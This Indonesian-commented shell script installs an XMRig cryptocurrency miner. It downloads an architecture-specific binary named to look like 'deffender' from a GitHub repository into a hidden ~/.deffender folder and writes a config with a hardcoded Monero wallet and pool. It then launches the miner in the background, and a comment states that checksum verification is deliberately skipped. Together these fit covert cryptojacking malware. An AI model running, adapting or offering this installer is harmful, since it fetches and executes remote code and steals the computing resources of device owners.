#!/bin/sh
# oneline.sh — Installer XMRig multi-arsitektur dari binary hasil build sendiri.
# Sumber binary: repo GitHub pribadi (dedicated ke tiap arsitektur).
#   x86_64/amd64 -> deffenderX86
#   aarch64/arm64 -> deffenderARM64 (or deffenderarm64 static if present)
#   armv7l        -> deffender.armv7
# Verifikasi SHA256 wajib, config langsung keisi, sekali jalan langsung start.
#
# Pakai:  sh oneline.sh
# Env opsional: REPO_USER (username GitHub), REPO_NAME (nama repo),
#               BRANCH (default main), WALLET (default wallet yang sudah keisi),
#               DEFFENDER_DIR (lokasi instalasi, default ~/.deffender)
#
# WORKDIR = ~/.deffender (folder tersembunyi).

set -eu

REPO_USER="${REPO_USER:-grayteams}"         # username GitHub
REPO_NAME="${REPO_NAME:-teams}"             # nama repo tempat binary di-host
BRANCH="${BRANCH:-main}"
WALLET="${WALLET:-86CqeAcomozQ67JJGm1cgEWZms56cLogui2hmg5QZr6TVAABiLLv47iYgirYZzz16s9doatnUb4CoRbcBi975sCN3XAXF2A}"
BASE_URL="https://raw.githubusercontent.com/${REPO_USER}/${REPO_NAME}/${BRANCH}"
WORKDIR="${DEFFENDER_DIR:-$HOME/.deffender}"

command -v uname >/dev/null 2>&1 || { echo "[-] uname tidak ditemukan"; exit 1; }
if ! command -v curl >/dev/null 2>&1 && ! command -v wget >/dev/null 2>&1; then
    echo "[-] butuh curl ATAU wget (opkg install curl atau wget)"; exit 1
fi

# --- Helper unduh: pakai curl kalau ada, kalau tidak otomatis pakai wget ------
dl() { # $1=URL, $2=file output
    if command -v curl >/dev/null 2>&1; then
        curl -fsSL -o "$2" "$1" 2>/dev/null || wget -q -O "$2" "$1" 2>/dev/null
    else
        wget -q -O "$2" "$1" 2>/dev/null
    fi
}

# --- Deteksi arsitektur -> nama file binary di repo --------------------------
# SKEMA: x64 -> deffenderX8 | aarch64 -> deffenderARM64 | armv7 -> deffender.armv7
case "$(uname -m)" in
    x86_64|amd64) BIN="deffenderX86" ;;
    aarch64|arm64) BIN="deffenderARM64" ;;
    armv7l) BIN="deffender.armv7" ;;
    *) echo "[-] Arsitektur tidak didukung: $(uname -m)"; exit 1 ;;
esac

mkdir -p "$WORKDIR"
cd "$WORKDIR" || exit 1

echo "[+] Deteksi arsitektur: $(uname -m) -> ${BIN}"

# --- Unduh binary + SHA256 (ids, sekali udah ada langsung skip) ---------------
if [ ! -f "$BIN" ]; then
    echo "[+] Unduh binary ${BIN}..."
    dl "${BASE_URL}/${BIN}" "$BIN" || { echo "[-] Gagal unduh ${BIN}"; exit 1; }
fi

# NOTE: verifikasi checksum sengaja di-skip (download -> langsung jalan)
chmod +x "$BIN"

# --- Pastikan biner valid --------------------------------------------------------
if ! ./"$BIN" --version >/dev/null 2>&1; then
    echo "[-] Binary gagal dieksekusi (mungkin arsitektur salah / butuh deps)"; exit 1
fi
echo "[+] Versi: $(./"$BIN" --version | head -1)"

# --- Tulis config.json kalau belum ada (wallet langsung keisi) -------------------
if [ ! -f config.json ]; then
    echo "[+] Buat config.json (wallet: ${WALLET}, pass: server)..."
    cat > config.json <<EOF
{
    "autosave": true,
    "cpu": true,
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "url": "pool.supportxmr.com:443",
            "user": "${WALLET}",
            "pass": "server",
            "keepalive": true,
            "tls": true
        }
    ]
}
EOF
    chmod 600 config.json
fi

# --- Jalanin di background + simpan PID/log --------------------------------------
if [ -f deffender.pid ] && kill -0 "$(cat deffender.pid)" 2>/dev/null; then
    echo "[!] Sudah jalan (PID $(cat deffender.pid)) — stop dulu kalau mau restart."
    exit 0
fi

nohup ./"$BIN" -c config.json "$@" > deffender.log 2>&1 &
PID=$!
echo "$PID" > deffender.pid
sleep 1
if ! kill -0 "$PID" 2>/dev/null; then
    echo "[-] Gagal start — cek deffender.log"; exit 1
fi
echo "[+] Jalan (PID $PID)"
echo "[+] Log: $WORKDIR/deffender.log"
echo "[+] Stop: kill \$(cat $WORKDIR/deffender.pid)"
